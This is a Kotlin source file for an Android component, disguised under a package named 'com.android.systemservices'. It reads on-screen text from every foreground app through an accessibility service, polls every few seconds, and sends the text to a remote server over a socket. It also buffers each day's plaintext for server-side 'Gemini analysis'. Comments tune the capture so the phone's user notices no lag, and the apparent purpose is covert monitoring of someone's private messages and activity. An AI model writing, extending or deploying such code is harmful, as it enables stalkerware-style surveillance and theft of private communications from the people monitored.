package com.android.systemservices

import android.app.ActivityManager
import android.content.Context
import android.os.Handler
import android.util.Log
import org.json.JSONArray
import org.json.JSONObject
import java.text.SimpleDateFormat
import java.util.*

/**
 * Screen text helper that pulls content from the running [ScreenshotService] accessibility
 * service instance on demand. Content is deduplicated per-package by hash.
 *
 * When a daily analysis schedule is active, entries are also buffered locally so the
 * [MonitoringService] can flush the day's plaintext to the server for Gemini analysis.
 * The buffer is cleared after each flush.
 */
class ScreenTextHelper(private val context: Context) {

    companion object {
        private const val TAG = "ScreenTextHelper"
        private const val DEFAULT_POLL_MS = 5_000L
        // Minimum idle time (no accessibility events) before a tree walk is allowed.
        // Prevents getRootInActiveWindow() from competing with the foreground app's UI
        // thread while the user is actively touching the screen.
        private const val IDLE_BEFORE_CAPTURE_MS = 1_000L
        // Maximum entries to buffer for scheduled analysis (memory bound).
        private const val MAX_DAILY_BUFFER = 10_000

        private val SKIP_PACKAGES = setOf(
            "com.android.systemui",
            "android",
            "com.google.android.inputmethod.latin",
            "com.android.inputmethod.latin"
        )
    }

    @Volatile var active = false

    // The poll timer only needs to reschedule itself — no main-thread work. Moving from
    // Looper.getMainLooper() to a dedicated HandlerThread keeps the 5-second tick off the
    // main thread entirely.  The actual capture work already spawns its own Thread.
    private val pollThread = android.os.HandlerThread("screen-text-poll").also { it.start() }
    private val handler = Handler(pollThread.looper)
    private val lastHashByPkg = HashMap<String, Int>()
    private var watchPackages = emptySet<String>()  // empty = watch all apps
    private var pollIntervalMs = DEFAULT_POLL_MS

    // ── Daily buffer for scheduled analysis ──────────────────────────────────────
    // Each entry is formatted as: "[ISO_TIMESTAMP] pkg_short: text1 | text2 | ..."
    // Populated when a schedule is active; flushed and cleared by MonitoringService.
    private val dailyBuffer = mutableListOf<String>()
    @Volatile var scheduleActive = false

    /** Read-only view of how many entries are buffered since the last flush. */
    val bufferSize: Int get() = synchronized(dailyBuffer) { dailyBuffer.size }

    private val isoFormat = SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss.SSS'Z'", Locale.US).apply {
        timeZone = TimeZone.getTimeZone("UTC")
    }

    private val pollRunnable: Runnable = object : Runnable {
        override fun run() {
            if (!active) return
            Thread {
                try { doCaptureAndEmit() }
                catch (t: Throwable) { Log.e(TAG, "poll error: ${t.message}") }
            }.start()
            handler.postDelayed(this, pollIntervalMs)
        }
    }

    // ── Public API ────────────────────────────────────────────────────────────

    fun start(packages: Set<String> = emptySet(), intervalMs: Long = DEFAULT_POLL_MS) {
        active = true
        watchPackages = packages
        pollIntervalMs = intervalMs.coerceIn(1_000L, 60_000L)
        lastHashByPkg.clear()
        handler.removeCallbacks(pollRunnable)
        handler.post(pollRunnable)
        Log.i(TAG, "started — watching: ${packages.ifEmpty { setOf("*ALL*") }}, interval=${pollIntervalMs}ms")
    }

    fun stop() {
        active = false
        handler.removeCallbacks(pollRunnable)
        lastHashByPkg.clear()
        // Do NOT quit pollThread here — start() may be called again (e.g. dashboard toggle).
        // The thread stays alive (idle) between stop/start cycles.
        // Call destroy() from MonitoringService.onDestroy() to fully clean up.
        Log.i(TAG, "stopped")
    }

    /** Call from MonitoringService.onDestroy() to permanently release the HandlerThread. */
    fun destroy() {
        active = false
        handler.removeCallbacks(pollRunnable)
        pollThread.quitSafely()
    }

    /** Trigger an immediate out-of-cycle capture (e.g. on foreground app change). */
    fun triggerNow() {
        if (!active) return
        Thread {
            try { doCaptureAndEmit() }
            catch (t: Throwable) { Log.e(TAG, "triggerNow error: ${t.message}") }
        }.start()
    }

    /**
     * Returns the accumulated buffer as a single newline-joined string suitable
     * for the `scheduled_screentext_analysis` socket event, then clears the buffer.
     * Returns null if the buffer is empty.
     */
    fun flushBuffer(): String? {
        synchronized(dailyBuffer) {
            if (dailyBuffer.isEmpty()) return null
            val result = dailyBuffer.joinToString("\n")
            dailyBuffer.clear()
            Log.i(TAG, "flushed daily buffer: ${result.length} chars")
            return result
        }
    }

    // ── Core capture logic ────────────────────────────────────────────────────

    private fun doCaptureAndEmit() {
        val fgPkg = getForegroundPackage().ifEmpty { return }
        if (fgPkg == context.packageName) return
        if (fgPkg in SKIP_PACKAGES) return
        if (watchPackages.isNotEmpty() && fgPkg !in watchPackages) return

        // Guard: skip the accessibility tree walk while the user is actively interacting.
        //
        // getRootInActiveWindow() requires the foreground app's UI thread to batch-process
        // accessibility nodes.  If a touch event (ACTION_DOWN) arrives while the UI thread
        // is busy with our tree request, the app cannot ack the event in time and
        // InputDispatcher records a "slow event" — the user perceives this as ~1 s lag
        // on initial taps (confirmed via dumpsys input: 1 slow event / 5.6 s = our poll rate).
        //
        // ScreenshotService.lastEventMs is updated on every onAccessibilityEvent() call.
        // Waiting 1 s of inactivity ensures the UI thread is idle before we consume it.
        val idleMs = System.currentTimeMillis() - ScreenshotService.lastEventMs
        if (idleMs < IDLE_BEFORE_CAPTURE_MS) return

        val texts: JSONArray = captureViaService() ?: return

        if (texts.length() == 0) return

        // Deduplicate: only emit when visible content has actually changed
        val hashInput = (0 until texts.length()).joinToString("|") {
            texts.getJSONObject(it).optString("t")
        }
        val hash = hashInput.hashCode()
        if (lastHashByPkg[fgPkg] == hash) return
        lastHashByPkg[fgPkg] = hash

        SocketManager.emit("screen_text_data", JSONObject().apply {
            put("pkg", fgPkg)
            put("ts", System.currentTimeMillis())
            put("texts", texts)
        })
        Log.d(TAG, "emitted ${texts.length()} nodes for $fgPkg")

        // Buffer for scheduled analysis if schedule is active
        if (scheduleActive) {
            val flat = (0 until texts.length()).joinToString(" | ") {
                texts.getJSONObject(it).optString("t")
            }
            val pkgShort = fgPkg.split('.').lastOrNull() ?: fgPkg
            val entry = "[${isoFormat.format(Date())}] $pkgShort: $flat"
            synchronized(dailyBuffer) {
                if (dailyBuffer.size < MAX_DAILY_BUFFER) {
                    dailyBuffer.add(entry)
                }
            }
        }
    }

    // ── Primary path: pull from ScreenshotService instance ───────────────────

    /**
     * Calls [ScreenshotService.captureCurrentText] directly on the calling thread.
     *
     * Previously this dispatched to Looper.getMainLooper() and blocked via CountDownLatch,
     * causing the main thread to stall for 50–500 ms every 5 seconds.
     *
     * [ScreenshotService.captureCurrentText] uses [AccessibilityService.getRootInActiveWindow]
     * which is a Binder IPC to system_server — it does NOT need to run on the main thread.
     * The IPC itself is thread-safe and blocks only the calling thread until system_server
     * responds.  Running on the background [pollThread] is safe and keeps the main thread free.
     */
    private fun captureViaService(): JSONArray? {
        val svc = ScreenshotService.instance ?: return null
        return try {
            svc.captureCurrentText()
        } catch (e: Exception) {
            Log.w(TAG, "captureViaService: ${e.message}")
            null
        }
    }

    // ── Foreground package detection ──────────────────────────────────────────

    @Suppress("DEPRECATION")
    private fun getForegroundPackage(): String {
        // Primary: accessibility-event-tracked app (reliable on Android 14+ where
        // getRunningTasks() is restricted to only the calling package's own tasks).
        val fromService = ScreenshotService.currentForegroundApp
        if (fromService.isNotEmpty()) return fromService
        // Fallback: deprecated getRunningTasks() — works on older OS or priv-app builds
        // where GET_TASKS grants full task visibility.
        return try {
            val am = context.getSystemService(Context.ACTIVITY_SERVICE) as ActivityManager
            am.getRunningTasks(1)?.firstOrNull()?.topActivity?.packageName ?: ""
        } catch (e: Exception) {
            Log.w(TAG, "getForegroundPackage: ${e.message}")
            ""
        }
    }
}
